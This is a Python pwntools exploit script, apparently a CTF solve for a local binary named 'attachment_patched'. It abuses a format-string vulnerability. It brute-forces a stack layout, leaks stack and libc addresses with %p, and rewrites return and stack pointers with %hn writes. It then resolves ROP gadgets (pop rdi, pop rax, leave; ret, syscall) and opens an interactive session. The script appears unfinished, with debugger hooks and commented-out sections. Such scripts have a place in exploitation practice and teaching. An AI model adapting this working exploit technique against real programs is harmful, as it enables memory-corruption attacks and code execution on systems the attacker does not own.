from pwn import *
import sys

binary = './attachment_patched'
libc = ELF('./libc.so.6')
context.log_level = 'info'  # To see progress during bruteforce
context.binary = binary
context.arch = 'amd64'
# Bruteforce counter
attempts = 0
max_attempts = 500  # Adjust based on expected success rate
s = '''
b * printf
b * printf+198
'''

while attempts < max_attempts:
    attempts += 1
    
    try:
        # Start a new process for each attempt
        p = process(binary)
        
        # First format string to leak an address
        payload = b"%6$p"  
        p.sendline(payload)
        p.recvuntil(b"give you one chance!!!\n")
        leak = p.recvuntil(b"begin", drop=True).strip().decode()
        leak = int(leak, 16)
        rip = leak - 0x120
        
        
        bytes_to_write = rip & 0xffff
        
        payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
        
        bytes_to_write = 0x10000 - bytes_to_write + 0x140b + 5
        payload += f"%{bytes_to_write}c%41$hn".encode()
        
        p.sendline(payload)
        

        try:

            response = p.recvuntil(b"give you one chance!!!", timeout=2)
            
            if b"give you one chance!!!" in response:
                log.success(f"Success")
                log.success(f"RIP: {hex(rip)}")
                
                # We found a working exploit!
                
                break
                
        except EOFError:
            log.debug(f"Exploit attempt {attempts} did not restart program")
            p.close()
        except Exception as e:
            log.debug(f"Error checking for program restart: {str(e)}")
            p.close()
            
    except EOFError:
        log.debug(f"Attempt {attempts} failed with EOFError")
        p.close()
    except Exception as e:
        log.debug(f"Attempt {attempts} failed with: {str(e)}")
        try:
            p.close()
        except:
            pass
    

if attempts >= max_attempts:
    log.failure(f"Failed after {max_attempts} attempts")



payload = b"%19$p" # can only leak one address
p.send(payload)


leak = p.recvuntil("begin", drop = True).strip().decode()

leak = int(leak, 16)

buf = leak + 0x2c55
print(hex(leak))


written = 0
rsp = rip - 0x20
bytes_to_write = rsp & 0xffff
print(hex(bytes_to_write))
payload = f"%{bytes_to_write-8}c%c%c%c%c%c%c%c%c%hn".encode()

written += bytes_to_write

bytes_to_write = 0x10000 - written + 0x140b + 5
pos = int(0x138 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write


future_rbp = rip + 8 - 0x20 - 0x20 # may need to adjust here
bytes_to_write = future_rbp & 0xffff

print(hex(bytes_to_write))


if written % 0x10000 < bytes_to_write:
	bytes_to_write = bytes_to_write - (written % 0x10000)
else:
	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
	


payload += f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written += bytes_to_write

'''
bytes_to_write = buf & 0xffff
print(hex(bytes_to_write))


if written % 0x10000 < bytes_to_write:
	bytes_to_write = bytes_to_write - (written % 0x10000)
else:
	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write

pos = int(0x138 / 8 + 6)
#payload += f"%{bytes_to_write}c%{pos}$hn".encode()
print(len(payload))

gdb.attach(p, s)
'''
p.sendline(payload)




payload = b"%3$p"

p.sendline(payload)


p.recvuntil(b"give you one chance!!!\n")

leak = p.recvuntil("begin", drop = True).strip().decode()
leak = int(leak, 16)
libc_base = leak - 0x10e1f2

print(hex(libc_base))




# gadgets

pop_rdi = libc_base + 0x0000000000023b6a
pop_rax = libc_base + 0x0000000000036174
leave_ret = libc_base + 0x00000000000578c8
syscall = libc_base + 0x000000000002284d



written = 0
bytes_to_write = buf & 0xffff# buf is 0x55bff95c140b
pos = int(0x158 / 8 + 6)
print(hex(bytes_to_write))
payload = f"%{bytes_to_write}c%{pos}$hn".encode()
written += bytes_to_write

rsp = rip - 0x40
bytes_to_write = rsp & 0xffff
print(hex(bytes_to_write))

if written % 0x10000 < bytes_to_write:
	bytes_to_write = bytes_to_write - (written % 0x10000)
else:
	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
	
payload += f"%{bytes_to_write-11}c%c%c%c%c%c%c%c%c%c%c%c%hn".encode()
written += bytes_to_write

bytes_to_write = 0x140b + 5
pos = int(0x158 / 8 + 6)

if written % 0x10000 < bytes_to_write:
	bytes_to_write = bytes_to_write - (written % 0x10000)
else:
	bytes_to_write = 0x10000 - (written % 0x10000) + bytes_to_write
	
	
payload += f"%{bytes_to_write}c%{pos}$hn".encode()




print(len(payload))
gdb.attach(p, s)
p.sendline(payload)
p.interactive()

               
